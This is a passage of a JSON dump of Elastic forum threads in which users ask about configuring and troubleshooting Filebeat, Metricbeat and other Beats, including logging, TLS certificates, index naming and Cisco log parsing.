instance/beat.go:630 Beat ID: 55f6ab08-8179-4445-aa8a-e4e5b8693071 2020-04-08T12:42:21.868-0700 INFO add_cloud_metadata/add_cloud_metadata.go:89 add_cloud_metadata: hosting provider type not detected. 2020-04-08T12:42:21.869-0700 INFO [index-management] idxmgmt/std.go:182 Set output.elasticsearch.index to 'metricbeat-7.6.2' as ILM is enabled. 2020-04-08T12:42:21.869-0700 INFO elasticsearch/client.go:174 Elasticsearch url: https://192.168.10.179:9200 2020-04-08T12:42:21.870-0700 WARN tlscommon/tls_config.go:79 SSL/TLS verifications disabled. 2020-04-08T12:42:21.896-0700 WARN tlscommon/tls_config.go:79 SSL/TLS verifications disabled. 2020-04-08T12:42:21.957-0700 WARN tlscommon/tls_config.go:79 SSL/TLS verifications disabled. 2020-04-08T12:42:21.969-0700 INFO elasticsearch/client.go:757 Attempting to connect to Elasticsearch version 7.4.0 2020-04-08T12:42:22.011-0700 INFO [license] licenser/es_callback.go:50 Elasticsearch license: Basic",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "445274a0-1485-4078-97ce-358d348bcbc2",
    "url": "https://discuss.elastic.co/t/why-has-reserved-space-on-ext4-uid-of-filebeat/227157",
    "title": "Why has reserved space on ext4 uid of filebeat?",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "asp",
    "date": "April 8, 2020, 2:59pm April 9, 2020, 7:28am",
    "body": "Hi, Version: 7.5.2 Filebeat is running as unprivileged user filebeat as systemd service. we noticed the following on our servers: sudo tune2fs -l -u filebeat /dev/mapper/vg_root-root | grep -i reserved Setting reserved blocks uid to 2507 Reserved block count: 731340 Reserved GDT blocks: 1024 Reserved blocks uid: 2507 (user filebeat) Reserved blocks gid: 0 (group root) sudo tune2fs -l -u root /dev/mapper/vg_root-root | grep -i reserved Setting reserved blocks uid to 0 Reserved block count: 731340 Reserved GDT blocks: 1024 Reserved blocks uid: 0 (user root) Reserved blocks gid: 0 (group root) [aschampe@elastic01 ~]$ sudo tune2fs -l -u root /dev/mapper/vg_root-root | grep -i reserved So filebeat can use the reserved space and root has nothing reserved. Can you explain why reserved blocks uid is set to filebeat's uid instead of root? How can I prevent this? Thanks, Andreas",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "9d3f8882-252c-40df-81d6-117d877b9bba",
    "url": "https://discuss.elastic.co/t/management-audibet/224551",
    "title": "Management audibet",
    "category": [
      "Beats",
      "Auditbeat"
    ],
    "author": "nurhambali",
    "date": "March 22, 2020, 11:15am April 4, 2020, 9:05am April 7, 2020, 2:56am April 8, 2020, 2:33pm",
    "body": "hi, How do I make the configuration auditbeat done automatically, for example on the kibana server I prepare one master file audibeat.yml then I push it to all agents, is that possible? please advace? thanks, hambali",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "11259978-ee03-4c56-91bf-afe8a7afb0ed",
    "url": "https://discuss.elastic.co/t/loss-of-performance-with-cisco-module/226397",
    "title": "Loss of performance with Cisco module",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "",
    "date": "April 3, 2020, 3:31pm April 4, 2020, 12:41am April 6, 2020, 10:58am April 6, 2020, 2:55pm April 6, 2020, 8:56pm April 8, 2020, 1:29pm April 8, 2020, 1:43pm",
    "body": "",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "794374a9-debf-419f-b53f-07eedc15e1e4",
    "url": "https://discuss.elastic.co/t/we-want-to-increase-backoff-time-from-1s-to-3s-apart-from-delay-in-logs-does-this-have-any-other-affects-on-cpu-memory-network-of-filebeat-process/227132",
    "title": "We want to increase backoff time from 1s to 3s, apart from delay in logs, does this have any other affects on CPU/Memory/Network of filebeat process",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Manojbvn_Barthipudi",
    "date": "April 8, 2020, 1:13pm",
    "body": "Also, we have scan_frequency:30s close_inactive: 5m max_backoff: 10s backoff_factor: 2 what does harvester does after max_backoff? does it close the handler?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "8c21e251-3f46-4a67-8f5c-af952ac5badb",
    "url": "https://discuss.elastic.co/t/count-total-files/227125",
    "title": "Count total files",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Guerreiro_Sousa",
    "date": "April 8, 2020, 12:39pm",
    "body": "I have to count the total number of \"xpto * .log\" files in a given directory, I imagine Filebeat does not do that. Alternatively, can I just look at new files and not modified files? What are my alternatives to solve the file accounting problem?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "52792e16-2557-45cf-bc6f-2645215bf84d",
    "url": "https://discuss.elastic.co/t/which-nodes-to-include-in-output-host-in-filebeat-yml/227117",
    "title": "Which nodes to include in output.host in filebeat.yml?",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Daud_Ahmed",
    "date": "April 8, 2020, 11:47am April 8, 2020, 11:56am April 8, 2020, 12:11pm April 8, 2020, 12:14pm April 8, 2020, 12:16pm",
    "body": "I have like 5 elastic nodes in total. One node ingest and coordinating node while two are dedicated master nodes and the other two are dedicated data nodes. I have elasticsearch install on all my five nodes with respective settings. What i am confused about and want to know is. Does i need to include all the elasticsearch nodes ip addresses in filebeat.yml file which is install on seperate nodes output.elasticsearch.hosts: ['https://x.x.x.x', '' '',\"\" ] or i should add only the specific type of nodes ip:port in this list. Actually i am really confuse and don't know much about this. Filebeat will be inserting data into elasticsearch so can anyone guide on this.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "27dbe118-5837-4410-88a6-cdc93d46ed28",
    "url": "https://discuss.elastic.co/t/filebeat-doesnt-exclude-rotated-files/226191",
    "title": "Filebeat doesnt exclude rotated files",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Neropointer",
    "date": "April 2, 2020, 9:53am April 8, 2020, 11:58am",
    "body": "I try to grab the log files that only end in .log but Filebeat grabs the rotated logfiles .log.2020-03-11too. I dont understand why he does that. -type: log enabled: true paths: - /opt/service/**/service-*.log exclude: - '^\\/opt\\/service\\/.+\\/.+\\/.+\\/.+(.log).+' - '^\\/opt\\/.+(.backup)\\/.+' - ['\\.jar$']",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "ec5f6e5c-10f8-4ca2-a729-7f20060e9ed1",
    "url": "https://discuss.elastic.co/t/tailf-new-file-system-not-constant-to-logstash/226658",
    "title": "Tailf new file system( not constant) to logstash",
    "category": [
      "Beats"
    ],
    "author": "Dawood",
    "date": "April 6, 2020, 9:16am April 6, 2020, 6:12pm April 7, 2020, 1:47pm April 7, 2020, 6:10pm April 7, 2020, 7:07pm April 8, 2020, 9:57am April 8, 2020, 10:21am April 8, 2020, 10:27am",
    "body": "Hi, Using python infrastructure: I am already familiar of putting data into logstash via python module \" logstash_async\". It works excellent. My need now as part of test process on several nodes ( machines) is to give an ability to users who decide to write system machine logs such as \"dmesg\" by \"tail f\" these files for a period of time and push the output into logstash. Is there a way to do that ?",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "b51fcaa0-1b46-4832-a284-7bacc3a490cd",
    "url": "https://discuss.elastic.co/t/filebeat-not-logging-to-var-log-filebeat/227001",
    "title": "Filebeat not logging to /var/log/filebeat",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "newmember",
    "date": "April 7, 2020, 8:11pm April 8, 2020, 2:39am",
    "body": "I read this reference: https://discuss.elastic.co/t/filebeat-refuses-to-log-to-file-7-0-1/181846 I am on Ubuntu 18.04 Installed filebeat from the package: root@chris-Standard-PC-Q35-ICH9-2009:/etc# apt list filebeat Listing... Done filebeat/now 7.6.2 amd64 [installed,local] Filebeat Service: root@chris-Standard-PC-Q35-ICH9-2009:/etc# service filebeat status ● filebeat.service - Filebeat sends log files to Logstash or directly to Elasticsearch. Loaded: loaded (/lib/systemd/system/filebeat.service; disabled; vendor preset: enabled) Active: active (running) since Tue 2020-04-07 13:32:02 MDT; 6min ago Docs: https://www.elastic.co/products/beats/filebeat Main PID: 25716 (filebeat) Tasks: 12 (limit: 4915) CGroup: /system.slice/filebeat.service └─25716 /usr/share/filebeat/bin/filebeat -e -c /etc/filebeat/filebeat.yml -path.home /usr/share/filebeat -path.config /etc/filebeat -path.data /var/lib/filebeat -path.logs /var/log/filebteat I added logging to filebeat.yml #================================ Logging ===================================== # Sets log level. The default log level is info. # Available log levels are: error, warning, info, debug #logging.level: debug # At debug level, you can selectively enable logging only for some components. # To enable all selectors use [\"*\"]. Examples of other selectors are \"beat\", # \"publish\", \"service\". #logging.selectors: [\"*\"] logging.level: debug #logging.level: info logging.to_files: true logging.files: path: /var/log/filebeat name: filebeat keepfiles: 7 permissions: 0644 At this point the logging is to syslog For checking I ran the same start command from the service WITHOUT the \"-e\" root@chris-Standard-PC-Q35-ICH9-2009:/var/log/filebeat# /usr/share/filebeat/bin/filebeat -c /etc/filebeat/filebeat.yml -path.home /usr/share/filebeat -path.config /etc/filebeat -path.data /var/lib/filebeatpath.logs /var/log/filebeat & [1] 32443 I can see the log files now root@chris-Standard-PC-Q35-ICH9-2009:/var/log/filebeat# ls filebeat filebeat.1 Summary: I see the filebeat service start is using the \"-e\" option which is default from the filebeat package. In /etc/init.d/filebeat there is this line: # Do NOT \"set -e\" Question: How do I remove the \"-e\" from the filebeat service? Is this correct approach to get the logging to work to the /var/log/filebeat folder? Thanks",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "bf30e2c3-571e-4026-8036-b4303e1edc3b",
    "url": "https://discuss.elastic.co/t/cfgfile-is-not-read-after-first-failed-attempt/227041",
    "title": "Cfgfile - is not read after first failed attempt",
    "category": [
      "Beats"
    ],
    "author": "newmember",
    "date": "April 8, 2020, 2:19am",
    "body": "I thought it was interesting observation that the changed cfgfile was not re-read after the first attempt failed, until I restarted filebeat. Maybe there is an option I am missing to re-read failed config files. filebeat.config.inputs: enabled: true path: /tmp/inputs.d/*.yml reload.enabled: true reload.period: 60s Steps: Created an inputs.d/ folder Added to the filebeat.yml to read new cfgfile changes every 60s Added a new cfgfile in the folder with a .yml extension cfgfile is read the first time with an error corrected the the error cfgfile is not read again until filebeat service is restarted. root@chris-Standard-PC-Q35-ICH9-2009:/tmp# grep cfgfile /var/log/filebeat/filebeat.2 2020-04-07T16:27:23.837-0600 DEBUG [cfgfile] cfgfile/reload.go:137 Checking module configs from: /etc/filebeat/modules.d/*.yml 2020-04-07T16:27:23.837-0600 DEBUG [cfgfile] cfgfile/reload.go:151 Number of module configs found: 0 2020-04-07T16:27:23.837-0600 INFO cfgfile/reload.go:175 Config reloader started 2020-04-07T16:27:23.837-0600 INFO cfgfile/reload.go:175 Config reloader started 2020-04-07T16:27:23.838-0600 DEBUG [cfgfile] cfgfile/reload.go:205 Scan for new config files 2020-04-07T16:27:23.838-0600 DEBUG [cfgfile] cfgfile/reload.go:224 Number of module configs found: 0 2020-04-07T16:27:23.838-0600 DEBUG [reload] cfgfile/list.go:62 Starting reload procedure, current runners: 0 2020-04-07T16:27:23.838-0600 DEBUG [reload] cfgfile/list.go:80 Start list: 0, Stop list: 0 2020-04-07T16:27:23.838-0600 INFO cfgfile/reload.go:235 Loading of config files completed. 2020-04-07T16:28:23.838-0600 DEBUG [cfgfile] cfgfile/reload.go:205 Scan for new config files 2020-04-07T16:28:23.838-0600 DEBUG [cfgfile] cfgfile/cfgfile.go:193 Load config from file: /tmp/inputs.d/a.yml 2020-04-07T16:28:23.838-0600 ERROR cfgfile/reload.go:284 Error loading config from file '/tmp/inputs.d/a.yml', error invalid config: config file (\"/tmp/inputs.d/a.yml\") can only be writable by the owner but the permissions are \"-rw-rw-r--\" (to fix the permissions use: 'chmod go-w /tmp/inputs.d/a.yml') 2020-04-07T16:28:23.838-0600 DEBUG [cfgfile] cfgfile/reload.go:224 Number of module configs found: 0 2020-04-07T16:28:23.838-0600 DEBUG [reload] cfgfile/list.go:62 Starting reload procedure, current runners: 0 2020-04-07T16:28:23.838-0600 DEBUG [reload] cfgfile/list.go:80 Start list: 0, Stop list: 0 2020-04-07T16:29:23.839-0600 DEBUG [cfgfile] cfgfile/reload.go:205 Scan for new config files 2020-04-07T16:30:23.840-0600 DEBUG [cfgfile] cfgfile/reload.go:205 Scan for new config files 2020-04-07T16:31:23.841-0600 DEBUG [cfgfile] cfgfile/reload.go:205 Scan for new config files 2020-04-07T16:32:23.842-0600 DEBUG [cfgfile] cfgfile/reload.go:205 Scan for new config files 2020-04-07T16:33:23.842-0600 DEBUG [cfgfile] cfgfile/reload.go:205 Scan for new config files Thanks",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "74153f72-ede3-4fd1-a771-bf3b9e1581ae",
    "url": "https://discuss.elastic.co/t/build-filebeat-x-pack-cannot-export-dashboard/227015",
    "title": "Build filebeat x-pack cannot export dashboard",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Mike_Ware",
    "date": "April 7, 2020, 9:44pm",
    "body": "Once x-pack filebeat is build I cannot export dashboards. ''' MODULE=zeek ID=7cbb5410-3700-11e9-aa6d-ff445a78330c mage exportDashboard Error while connecting to Kibana: fail to get the Kibana version: HTTP GET request to http://localhost:5601/api/status fails: fail to execute the HTTP GET request: Get \"http://localhost:5601/api/status\": dial tcp 127.0.0.1:5601: connect: connection refused. Response: . exit status 1 Error: running \"go run -mod vendor /root/go/src/github.com/elastic/beats/dev-tools/cmd/dashboards/export_dashboards.go -output /root/go/src/github.com/elastic/beats/x-pack/filebeat/module/zeek/_meta/kibana/7/dashboard/7cbb5410-3700-11e9-a a6d-ff445a78330c.json -dashboard 7cbb5410-3700-11e9-aa6d-ff445a78330c\" failed with exit code 1 ''' I assume this is because it's looking for a local instance of Kibana but there's no documentation on setting it to an external instance.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "4b1eec89-cd65-4a3e-909f-a021e3617ef2",
    "url": "https://discuss.elastic.co/t/zeek-error-unpacking-configuration/226983",
    "title": "Zeek error unpacking configuration",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Mangolinux",
    "date": "April 7, 2020, 6:32pm April 7, 2020, 8:01pm",
    "body": "I am trying to configure the seek module and keep getting this error when I run sudo filebeat setup Exiting: 1 error: error unpacking module config: error creating config from fileset zeek/rfb: error unpacking configuration When I run journalctl -u filebeat.service I get ERROR instance/beat.go:933 Exiting: Fileset zeek/signatures is configured but doesn't exist",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "a5d02fd1-acf0-4d06-a2fc-695cbdeb0015",
    "url": "https://discuss.elastic.co/t/connecting-filebeat-with-elasticseach/226832",
    "title": "Connecting filebeat with elasticseach",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Daud_Ahmed",
    "date": "April 7, 2020, 6:56am April 7, 2020, 7:08pm April 7, 2020, 7:09pm April 7, 2020, 7:11pm April 7, 2020, 7:15pm April 7, 2020, 7:26pm",
    "body": "I have like 5 elastic nodes in total. One node ingest and coordinating node while two are dedicated master nodes and the other two are dedicated data nodes. I have elasticsearch install on all my five nodes with respective settings. What i am confused about and want to know is. Does i need to include all the elasticsearch nodes ip addresses in filebeat.yml file which is install on seperate node. output.elasticsearch.hosts: ['https://x.x.x.x', '' '',\"\" ] or i should add only the data nodes. Actually i am really confuse and don't know much about this. Filebeat will be inserting data into elasticsearch so can anyone guide on this.",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "31f3e3ca-29df-4967-b806-721a03bbd28c",
    "url": "https://discuss.elastic.co/t/cant-get-filebeat-dashboard-on-kibana/226984",
    "title": "Can't get filebeat dashboard on kibana",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "oumy",
    "date": "April 7, 2020, 6:40pm",
    "body": "hello there, i am trying to connect two machines, one master that has elasticsearch kibana and logstash, and a minion that has beats. trying to e/get the dashboard of file beat to the \"IPaddress: 5601\", yet it keeps sending an error, (can't execute http ...) i am a bit lost.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "0d50a639-babe-4fc6-ba5c-d58461f3cad8",
    "url": "https://discuss.elastic.co/t/filebeat-cannot-parse-certain-ftd-messages-bug/226969",
    "title": "Filebeat: Cannot parse certain FTD messages, bug?",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "SjoerdFurth",
    "date": "April 7, 2020, 5:50pm",
    "body": "At work we wanted to monitor our Cisco FTD using Elasticsearch and try the SIEM option. After setting this up with version 7.5.2 and 7.6.1 (when it released), I noticed some of the syslog messages not to be parsed correctly. One of the reasons is already fixed in GH issue 16889 due to some of the fields missing. The other issues I will demonstrate below. The syslog messages that are not working are: Mar 13 15:47:15 CISCOFTD %FTD-4-106023: Deny icmp src INSIDE:172.31.98.44 dst OUTSIDE:100.66.124.24 (type 8, code 0) by access-group \"CSM_FW_ACL_\" [0x900503bb, 0xf8ee23a1] The message above produces the error: Unable to find match for dissect pattern: %{event.outcome} %{network.transport} src %{_temp_.cisco.source_interface}:%{source.address}/%{source.port} dst %{_temp_.cisco.destination_interface}:%{destination.address}/%{destination.port} %{} access%{}group \\\\\\\"%{_temp_.cisco.list_id}\\\\\\\"%{} against source: Deny icmp src INSIDE:172.31.98.44 dst OUTSIDE:100.66.124.24 (type 8, code 0) by access-group \\\\\\\"CSM_FW_ACL_\\\\\\\" [0x900503bb, 0xf8ee23a1] This is due to Grok patterns not knowing about the type 8, code 0 part Mar 13 02:59:17 CISCOFTD %FTD-6-302014: Teardown TCP connection 108430644 for INSIDE:172.31.98.44/51568 to OUTSIDE:100.66.124.24/443 duration 82:03:50 bytes 1159060 TCP FINs from OUTSIDE The message above produces the error: Provided Grok expressions do not match field value: [Teardown TCP connection 108430644 for INSIDE:172.31.98.44/51568 to OUTSIDE:100.66.124.24/443 duration 82:03:50 bytes 1159060 TCP FINs from OUTSIDE] This is due to the session time being longer then 24 hours. I have seen sessions lasting even longer than 100 hours. Mar 13 01:25:42 CISCOFTD %FTD-6-302014: Teardown TCP connection 111775548 for INSIDE:172.31.98.44/59058 to OUTSIDE:100.66.124.24/902 duration 0:22:01 bytes 2415600809 TCP FINs from INSIDE The message above produces the error message: For input string: \\\"2415600809\\\" Since I had some spare time, I went and fixed the errors myself. I have published the changes here: github.com SjoerdFurth/beats/blob/7.6/x-pack/filebeat/module/cisco/shared/ingest/asa-ftd-pipeline.yml description: \"Pipeline for Cisco {< .internal_PREFIX >} logs\" processors: # # Parse the syslog header # # This populates the host.hostname, process.name, timestamp and other fields # from the header and stores the message contents in log.original. - grok: field: message patterns: - \"(?:%{SYSLOG_HEADER})?\\\\s*%{GREEDYDATA:log.original}\" pattern_definitions: SYSLOG_HEADER: \"(?:%{SYSLOGFACILITY}\\\\s*)?(?:%{FTD_DATE:_temp_.raw_date}:?\\\\s+)?(?:%{PROCESS_HOST}|%{HOST_PROCESS})(?:{DATA})?%{SYSLOG_END}?\" SYSLOGFACILITY: \"<%{NONNEGINT:syslog.facility:int}(?:.%{NONNEGINT:syslog.priority:int})?>\" # Beginning with version 6.3, Firepower Threat Defense provides the option to enable timestamp as per RFC 5424. FTD_DATE: \"(?:%{TIMESTAMP_ISO8601}|%{ASA_DATE})\" ASA_DATE: \"(?:%{DAY} )?%{MONTH} *%{MONTHDAY}(?: %{YEAR})? %{TIME}(?: %{TZ})?\" PROCESS: \"(?:[^%\\\\s:\\\\[]+)\" SYSLOG_END: \"(?:(:|\\\\s)\\\\s+)\" # exactly match the syntax for firepower management logs This file has been truncated. show original Can you confirm this is indeed a bug in the pipelines and check if the changes are according to the guidelines?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "7ebbecfe-6acf-4744-a6fb-abc38c8c1b7f",
    "url": "https://discuss.elastic.co/t/fields-yml-not-packaged/226968",
    "title": "Fields.yml not packaged?",
    "category": [
      "Beats",
      "Functionbeat"
    ],
    "author": "Matt_Howard",
    "date": "April 7, 2020, 5:44pm",
    "body": "Should the fields.yml be deployed along with the lambda (I'm on AWS)? I added some custom fields to fields.yml and noticed they weren't added to the index mapping. I tried to explicitly set setup.template.fields=fields.yml in functionbeat.yml, but when I deployed that I kept getting exceptions in my lambda because it couldn't find fields.yml (the logs indicating it was looking for a path on my local machine). I see that fields.yml isn't included in the package.zip that is created - so I'm wondering if I've misconfigured something or if I'm not understanding how the fields config is used? It seems the function is meant to create the index and the mappings (not something I should normally do from my local machine), but maybe I'm wrong about that.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "3871da4d-e532-4eae-9b4d-c0d1c6c9c3dd",
    "url": "https://discuss.elastic.co/t/problem-when-sending-info-from-filebeat-logstash-elasticsearch-kibana-in-windows/226732",
    "title": "Problem when sending info from Filebeat -> logstash -> Elasticsearch ->kibana in windows",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "",
    "date": "April 6, 2020, 2:21pm April 6, 2020, 6:04pm April 7, 2020, 1:36pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "29e0ff07-0550-4aa8-8798-cd127443729c",
    "url": "https://discuss.elastic.co/t/oracle-linux-redhat-will-not-open-filebeat-port/226866",
    "title": "Oracle Linux (RedHat) will not open filebeat port",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "calanon",
    "date": "April 7, 2020, 12:52pm April 7, 2020, 1:03pm",
    "body": "I am running my filebeat on port 2561, when checking netstat there is no port of this type open. I am running filebeat in debug mode and I see nothing in the output.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "52b5167d-cecb-45e9-84cd-cf2233d0a3cb",
    "url": "https://discuss.elastic.co/t/beats-index-management/226894",
    "title": "Beats index management",
    "category": [
      "Beats"
    ],
    "author": "michielM",
    "date": "April 7, 2020, 12:40pm",
    "body": "Hi all, Currently, I,m trying to change the index name in a way that every server I connect is a prefix of the index. For example: currently, I just have auditbeat-7.6.1-2020.03.27-000001 as index name, but I want to have serverA-auditbeat-7.6.1-2020.03.27-000001 How do I do this? and can I still have ILM enabled while doing so? Thanks a lot in advance",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "c75aabb5-44e5-41f6-acf5-e78c4115f0ca",
    "url": "https://discuss.elastic.co/t/filebeat-stop-after-sometimes-while-reading-yarn-logs/226702",
    "title": "Filebeat stop after sometimes while reading yarn logs",
    "category": [
      "Beats"
    ],
    "author": "ucguy4u",
    "date": "April 6, 2020, 12:00pm April 6, 2020, 6:53pm April 7, 2020, 7:49am April 7, 2020, 7:50am April 7, 2020, 8:35am April 7, 2020, 10:47am",
    "body": "I am using filebeat to ship data of yarn logs of hadoop. I am using is filebeat-7.5.1 ` filebeat.inputs: type: log enabled: true paths: /root/hadoop/userlogs/**/stderr /root/ingest-logs/ingest.log /root/root-logs/root.log ` This is configuration mention in the filebeat.yml ` 2020-04-01T16:12:54.871+0530 INFO kafka/log.go:53 producer/broker/1 maximum request accumulated, waiting for space 2020-04-01T16:12:54.896+0530 INFO kafka/log.go:53 producer/broker/1 maximum request accumulated, waiting for space 2020-04-01T16:12:55.876+0530 INFO kafka/log.go:53 producer/broker/1 maximum request accumulated, waiting for space 2020-04-01T16:13:05.950+0530 INFO beater/filebeat.go:443 Stopping filebeat 2020-04-01T16:13:05.951+0530 INFO crawler/crawler.go:139 Stopping Crawler 2020-04-01T16:13:05.956+0530 INFO crawler/crawler.go:149 Stopping 1 inputs 2020-04-01T16:13:05.962+0530 INFO input/input.go:149 input ticker stopped 2020-04-01T16:13:05.962+0530 INFO input/input.go:167 Stopping Input: 4626669614810496825 2020-04-01T16:13:05.962+0530 INFO log/harvester.go:272 Reader was closed: /scratch/oba/logs/hadoop/userlogs/application_1582785823666_2626/container_1582785823666_2626_01_000002/stderr. Closing. 2020-04-01T16:13:05.962+0530 INFO log/harvester.go:272 Reader was closed: /root/ingest-logs/ingest.log. Closing. 2020-04-01T16:13:05.962+0530 INFO log/harvester.go:272 Reader was closed: /root/ingest-logs/ingest.log. Closing. 2020-04-01T16:13:05.962+0530 INFO log/harvester.go:272 Reader was closed: /root/hadoop/userlogs/application_1582785823666_2626/container_1582785823666_2626_01_000001/stderr. Closing. 2020-04-01T16:13:05.961+0530 INFO cfgfile/reload.go:229 Dynamic config reloader stopped 2020-04-01T16:13:05.971+0530 INFO crawler/crawler.go:165 Crawler stopped 2020-04-01T16:13:05.971+0530 INFO registrar/registrar.go:367 Stopping Registrar 2020-04-01T16:13:05.971+0530 INFO registrar/registrar.go:293 Ending Registrar ` I have a concern about the rolling logs in the yarn and inactive log file. Does it affect the workingof filbeat. Can you please suggest the changes required in filebeat to keep filebeat alive.",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "0838aacc-4fea-4bdf-b435-8c4463980160",
    "url": "https://discuss.elastic.co/t/x509-cannot-validate-certificate-for-xx-xx-xx-xxbecause-it-doesnt-contain-any-ip-sans/226706",
    "title": "X509: cannot validate certificate for xx.xx.xx.xxbecause it doesn't contain any IP SANs",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Daud_Ahmed",
    "date": "April 6, 2020, 12:14pm April 6, 2020, 6:43pm April 6, 2020, 6:45pm April 7, 2020, 6:31am April 7, 2020, 10:00am April 7, 2020, 10:24am",
    "body": "I am able to curl my elasticsearch API successfully curl -k --verbose https://username:password@x.x.x.x:9900 But when i'm trying to connect my filebeat to elasticsearch i'm getting the error x509: cannot validate certificate for xx.xx.xx.xxbecause it doesn't contain any IP SANs. I'm using nginx to reverse proxy to elasticsearch api via the setting below server { listen 9900 default_server; listen [::]:9900; ssl on; ssl_certificate /etc/pki/tls/certs/elastic-access.pem; ssl_certificate_key /etc/pki/tls/private/elastic-access.key; access_log /var/log/nginx/nginx.access.log; error_log /var/log/nginx/nginx.error.log; location / { auth_basic \"Restricted\"; auth_basic_user_file /etc/nginx/conf.d/kibana.htpasswd; proxy_pass http://x.x.x.x:9200/; } } i don't know much about ssl. Below are the setting i am using in my filebeat.yml file output.elasticsearch.hosts: ['https://x.x.x.x:9900'] output.elasticsearch.username: username output.elasticsearch.password: password There are few options for ssl written in the documentation but i m confuse output.elasticsearch.ssl.certificate_authorities: [\"/etc/pki/root/ca.pem\"] output.elasticsearch.ssl.certificate: \"/etc/pki/client/cert.pem\" output.elasticsearch.ssl.key: \"/etc/pki/client/cert.key\" They are mention in the documentation but i am not able to understand them well. Do i need to copy the .pem and .key from elasticsearch machine and create these file in filebeat machine and then reference them in filebeat.yml file as describe in documentation even then i do not have ca.pem in my elasticmahine.",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "072aeb3a-2eb6-4938-bb51-30685dda5f34",
    "url": "https://discuss.elastic.co/t/beats-configuration-overlaping-between-output-elasticsearch-and-cloud/226704",
    "title": "Beats configuration: overlaping between output.elasticsearch and cloud.*?",
    "category": [
      "Beats"
    ],
    "author": "ffknob",
    "date": "April 6, 2020, 12:05pm April 7, 2020, 7:50am April 6, 2020, 7:12pm April 7, 2020, 7:51am",
    "body": "Hi I'm just curious about the needed settings in a Beat file when the cluster is in the Elastic cloud. Currently my config files looks like this: output.elasticsearch: hosts: [\"https://....us-east-1.aws.found.io:...\"] username: \"monitor\" password: \"${MONITOR_PASSWORD}\" compression_level: 3 setup.kibana: host: \"....us-east-1.aws.found.io:...\" protocol: \"https\" cloud.id: \"monitor:...==\" cloud.auth: \"monitor:${MONITOR_PASSWORD}\" The docs state that I could use the cloud.* output to make things easier. But that output doesn't have settings like the compression_level for instance. Could the above configuration be reduced to something like this: output.elasticsearch: compression_level: 3 cloud.id: \"monitor:...==\" cloud.auth: \"monitor:${MONITOR_PASSWORD}\" Should I choose between output.elasticsearch or cloud.*? Shoul I use both because I want to set the compression_level? What is the setup.kibana used for? Only to set the dashboards one time for cluster? Thank you",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "f20f1960-b994-4b60-a545-692a0ec1e18e",
    "url": "https://discuss.elastic.co/t/logging-only-kubelet-logs/226694",
    "title": "Logging only kubelet logs",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "",
    "date": "April 6, 2020, 11:36am April 7, 2020, 10:25am April 7, 2020, 10:25am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "70234229-7fe4-4b6b-8b23-b2de7cfc95ea",
    "url": "https://discuss.elastic.co/t/multiline-for-logline-starting-with-status-or-info/226761",
    "title": "Multiline for Logline starting with \"STATUS\" or \"INFO\"",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Mehak_Bhargava",
    "date": "April 6, 2020, 6:14pm April 7, 2020, 3:57am",
    "body": "I have some logs whose one word starts with \"STATUS\" or \"INFO\" and in my multline pattern, I want to identify these words as starting point. WHat will be the multiline? I tried multiline.pattern: '^%{WORD}' Sample Logs are below - STATUS | wrapper | 2019/12/03 05:18:27 | --> Wrapper Started as Service INFO | jvm 832 | 2020/02/25 09:00:04 | at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_181] INFO | jvm 2 | 2020/03/25 12:36:32 | 2020-03-25 12:36:32,291 INFO [WrapperSimpleAppMain] o.s.web.context.ContextLoader - Root WebApplicationContext: initialization started I saw that in some examples when log doesnt start from date or timestamp, we can give a customized pattern like this- multiline: pattern: 'wordwewanttostartsentencefrom: Identifier$' negate: true match: after",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "dbfe4948-cf84-4c81-b7d2-7e8f95d0caaf",
    "url": "https://discuss.elastic.co/t/can-i-run-metricbeat-packetbeat-etc-inside-a-docker-on-windows/226782",
    "title": "Can i run metricbeat, packetbeat etc.. inside a docker on windows?",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "",
    "date": "April 6, 2020, 9:36pm",
    "body": "",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "fb8f97f1-e290-436a-9896-1c9fa848eaf5",
